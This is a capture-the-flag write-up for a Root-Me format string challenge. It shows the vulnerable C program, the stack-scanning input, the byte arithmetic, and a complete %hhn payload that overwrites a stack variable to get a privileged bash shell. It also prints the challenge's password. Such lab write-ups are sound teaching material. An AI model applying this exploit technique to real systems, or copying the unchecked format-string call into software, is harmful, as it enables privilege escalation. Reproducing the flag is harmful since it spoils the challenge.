# ELF x86 - Format string bug basic 2
- Point: 20pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en),  8 April 2015
- Level: Medium<br><br>
![image](https://user-images.githubusercontent.com/48288606/141644747-50305e8e-2a4d-4b42-8c15-5d3c4b322654.png)
## Write-up:

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main( int argc, char ** argv )
 
{
 
        int var;
        int check  = 0x04030201;
 
        char fmt[128];
 
        if (argc <2)
                exit(0);
 
        memset( fmt, 0, sizeof(fmt) );
 
        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );
 
        snprintf( fmt, sizeof(fmt), argv[1] );
 
        if ((check != 0x04030201) && (check != 0xdeadbeef))    
                printf ("\nYou are on the right way !\n");
 
        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );
 
        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}
```
References:
([%n format specifier](https://www.geekforgeeks.org/g-fact-31/))


Our aim is overwriting the **check**'s value. We leverage a vulnerability in 
`snprintf( fmt, sizeof(fmt), argv[1] );` 
with no **format specifier**. Examine the stack and find a way to change that value.

### Solution:
Let's try looking into the stack by usual payload to discover the posibility of overwritting and "scanning" the stack<br>
`./ch14 aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x`<br>
Output:

![image](https://user-images.githubusercontent.com/48288606/146907436-2d2cfdb9-ab69-411b-a6e7-2366ba28adb9.png)

- As shown, the "AAAA" value is written in 9th of format string, we can prepare our value to this location.
- There are 2 ways to get **"deadbeef"** value. We can split it into 4 bytes or 2 bytes, the more division, the more relief execution time is. So i take second method.
- Split `0xdeadbeef` into 4 bytes and we will overwrite  with "little-endian" order. `0xef`, `0xbe`, `0xad`, `0xde` and convert to decimal for calculating for later as below:
```
>>> int(0xef)
239
>>> int(0x1be)
446
>>> int(0x2ad)
685
>>> int(0x3de)
990
```
- We have to make these value increase continously in our stack so we ensure that **0xef < 0x1be < 0x2ad < 0x3de** and then we use **%hhn** to get 1 byte value to have our desired values. (We can use **%hn** if we use the first method - split into 2 parts of 2 bytes). Then we calculate the value to add between these bytes to get specific value. 
 - We already have 16 bytes address, to get the right value of first byte. We pad more **239 - 16 = 223**
 - We already have 239 bytes above, to get the right value of first byte. We pad more **446 - 239 = 207**
 - We already have 446 bytes above, to get the right value of first byte. We pad more **685 - 446 = 239**
 - We already have 685 bytes above, to get the right value of first byte. We pad more **990 - 685 = 305**

Here's the layout of what we've done until now: 

![image](https://user-images.githubusercontent.com/48288606/146911826-3d6f1aa6-cec3-4516-83da-dbaae0f18105.png)

Payload: `./ch14 $(python -c "print('\x98\xfa\xff\xbf' + '\x99\xfa\xff\xbf' + '\x9a\xfa\xff\xbf' + '\x9b\xfa\xff\xbf' + '%223d%9\$hhn' + '%207d%10\$hhn' + '%239d%11\$hhn' + '%305d%12\$hhn')")`

Pass: 1l1k3p0Rn&P0pC0rn


